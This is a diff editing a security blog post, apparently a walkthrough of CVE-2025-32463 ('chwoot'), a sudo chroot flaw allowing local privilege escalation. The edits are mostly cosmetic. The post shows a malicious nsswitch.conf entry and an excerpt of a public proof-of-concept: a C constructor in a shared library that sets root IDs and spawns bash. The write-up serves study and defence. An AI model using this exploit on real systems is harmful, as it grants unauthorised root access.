@@ -1,5 +1,5 @@
 ---
-title: "Breaking Out with chroot: CVE-2025-32463 (chwoot) in Sudo"
+title: "Exploring CVE-2025-32463 local privilege escalation (chwoot) in Sudo"
 date: 2025-07-13 16:39:46
 tags:
 - sudo
@@ -10,9 +10,9 @@ tags:
 description: "In this post, we dive into CVE-2025-32463, a recently disclosed vulnerability in Sudo’s -R -chroot option  that allows local privilege escalation by abusing `chroot` in combination with how `nsswitch` resolves system resources. Discovered by Rich Mirch, this flaw makes It  possible for an attacker to trick sudo into loading an arbitrary shared library by creating an `/etc/nsswitch.conf` file under the user-specified root directory."
 comments: true
 ---
-![alt text](../images/chwoot/image.png)
+![Chatwoot application interface showing CVE-2025-32463 vulnerability](../images/chwoot/image.png)
 
-# __OERVIEW
+# __OVERVIEW
 
 In this post, we dive into **CVE-2025-32463**, a recently disclosed vulnerability in Sudo’s `-R` (`--chroot`) option  that allows local privilege escalation by abusing `chroot` in combination with how `nsswitch` resolves system resources. Discovered by **Rich Mirch**, this flaw makes It  possible for an attacker to trick sudo into loading an arbitrary shared library by creating an `/etc/nsswitch.conf` file under the user-specified root directory. 
 <!-- more -->
@@ -45,16 +45,17 @@ To function properly within a chroot jail, the target directory must contain **a
 
 Below is an example  Sudo rule. The lowpriv account is allowed to execute `/bin/bash` under `/web`. In this example rule, the user does not pass the chroot directory using the command-line options. Instead, Sudo will `chroot` to `/web` prior to executing `/bin/bash`. Meaning `/web` becomes bash's root directory.
 
-```
-sudo chroot=/web /bin/bash
+```shell
+vipa0z $ sudo chroot=/web /bin/bash
 after ch:
 /web/bin/bash
 ```
 
 When the command is executed via Sudo, the root path will be set to `/web`, so` /web/bin/bash` must exist along with any linked libraries. The example below of `lsof` command output shows the lowpriv user running `/bin/bash` under `/web` via `rtd`: (short for root dir).
-```none
-$ sudo chroot /web /bin/bash
-$ lsof 
+```shell
+vipa0z $ sudo chroot /web /bin/bash
+
+vipa0z $ lsof 
 COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME 
 bash    160095 root  cwd    DIR  252,0     4096 1048596 /web 
 bash    160095 root  rtd    DIR  252,0     4096 1048596 /web 
@@ -72,7 +73,7 @@ Additionally, commands like `ls` or `cd` won’t work because their binaries wer
 `nsswitch.conf` (short for **Name Service Switch**) is a configuration file in linux   located at `/etc/nsswitch.conf`. nsswitch tells the system **how to resolve names and look up various types of information**  such as usernames, hostnames, groups, passwords, and more.
 #### Inside the config file
 The following `nsswitch.conf` entries define where the system should look when resolving various types of information:
-```
+```shell
 passwd:     files systemd
 group:      files
 shadow:     files
@@ -85,12 +86,13 @@ Each line has the format:
 ```
 For example:
 
-- `hosts: files dns`  
+- hosts: files dns
     → When resolving hostnames (e.g., for `ping google.com`), check:
     1. `/etc/hosts` (`files`)
     2. DNS servers (`dns`)
 a little detail here
-```
+
+```shell
 passwd: files ldap
 ```
 
@@ -108,8 +110,6 @@ A **library** is a collection of precompiled code that can be reused by programs
 
 ## CVE-2025-32463 (chwoot)
 
-### Sudo chroot Elevation of Privilege Walkthrough
-
 CVE-2025-32463 was introduced in `Sudo v1.9.14` (June 2023) with the update to the _command matching handling code_ when the chroot feature is used.
 from update notes:
 _Improved command matching when a chroot is specified in sudoers. The sudoers plugin will now change the root directory id needed before performing command matching. Previously, the root directory was simply prepared to the path that was being processed._
@@ -120,7 +120,7 @@ Allowing a low-privileged user the ability to call _chroot()_ with root authorit
 
 ### nsswitch abuse
 One interesting note that may not be immediately apparent when reading the _nsswitch.conf_ file is that the name of the source is also used as part of the path for a shared object (library). For example
-```none
+```shell
 passwd:         files ldap
 group:          files ldap
 ```
@@ -131,11 +131,12 @@ Because of this behavior,  **any local user can trick Sudo into loading  an arbi
 
 To exploit this issue, the following _/etc/nsswitch.conf_ file was placed inside of the chrooted environment. The _/vipa0z_ NSS "source" is translated to _libnss_/vipa0z.so.2, which is a shared object under a path we control.
 
-```none
+```shell
 passwd: /vipa0z
 ```
 The folllowing stack trace shows the malicious shared object that has been loaded by Sudo. 
-```none
+
+```cpp
 #0  0x0000763a155db181 in woot () from libnss_/vipa0z.so.2
 #1  0x0000763a1612271f in call_init
 #8  0x0000763a1612a164 in _dl_open (file="libnss_/vipa0z.so.2", 
@@ -154,7 +155,6 @@ with all the ABC out of the way, now for the fun part:
 let's start by grapping this  PoC, written by [pr0v3rbst](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) and begin to dissect it
 This exploit utilizes a shared library object (`.so`) to create a bash process running as the root user
 ```c
-cat > vipa0z.c<<EOF
 #include <stdlib.h>
 #include <unistd.h>
 
@@ -164,7 +164,6 @@ __attribute__((constructor)) void woot(void) {
   chdir("/");
   execl("/bin/bash", "/bin/bash", NULL);
 }
-EOF
 ```
 We begin by defining a **constructor function** in C, a special function marked to execute **before `main()` runs**. Inside this constructor, the process’s **effective user ID and group ID** (`euid` and `egid`) are both set to `0`, giving the process **root-level privileges**.
 
